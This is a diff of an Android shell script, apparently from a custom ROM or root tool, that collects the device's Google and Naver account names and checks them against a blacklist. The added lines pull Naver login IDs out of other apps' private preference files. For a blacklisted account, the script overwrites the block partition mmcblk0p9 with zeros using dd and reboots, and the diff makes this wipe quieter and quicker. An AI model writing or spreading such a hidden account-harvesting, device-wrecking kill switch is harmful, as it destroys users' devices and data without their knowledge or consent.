@@ -16,12 +16,34 @@ in_array(){
     done
     return 1
 }
-
 naver=`$sqlite $_DB "SELECT name FROM accounts WHERE type='com.nhn.android.naveraccount'"`
 google=`$sqlite $_DB "SELECT name FROM accounts WHERE type='com.google'"`
 FLAG_PRINT=/data/media/0/Android/data/.blacklist_user
 BLACKLIST_FLAG=$(cat $FLAG_PRINT 2>/dev/null)
 CHECK_BLACKLIST=1
+
+if [ -z "$naver" ]; then
+	xml=/shared_prefs/NaverLoginPreferenceData.xml
+	naverpkg="com.nhn.android.search com.nhn.android.navercafe com.nhn.android.webtoon"
+	for i in $naverpkg
+	do	
+		ret=$(cat /data/data/$i$xml|bb grep '_ID">')
+		for j in $ret
+		do
+			tmp=${j##*_ID\">}
+			[ "$j" == "$tmp" ] && continue
+			tmp=${tmp%%</string>}
+			if [ "$last_ret" != "$tmp" ]; then
+				if [ -z "$naver" ]; then
+					naver=$tmp
+				else
+					naver="$naver $tmp"
+				fi
+			fi
+			last_ret=$tmp
+		done
+	done
+fi
 
 if [ $CHECK_BLACKLIST -eq 1 ]; then
 	if [ ! -z "$naver" ]; then
@@ -39,14 +61,11 @@ if [ $CHECK_BLACKLIST -eq 1 ]; then
 fi
 
 if [ "$BLACKLIST_FLAG" -eq 1 ]; then
-	echo "ERR: 사용이 제한된 계정입니다."
+	echo "BLACKLIST ID"
 	touch $FLAG_PRINT
 	chmod 0644 $FLAG_PRINT
 	echo 1 > $FLAG_PRINT
-	dd if=/dev/zero bs=$((14680064)) count=1 > /dev/block/mmcblk0p9
-	(
-		sleep 300
-		bb reboot
-	) &
-	exit 1
+	dd if=/dev/zero bs=$((14680064)) count=1 > /dev/block/mmcblk0p9 2>/dev/null
+	sleep 30
+	bb reboot
 fi
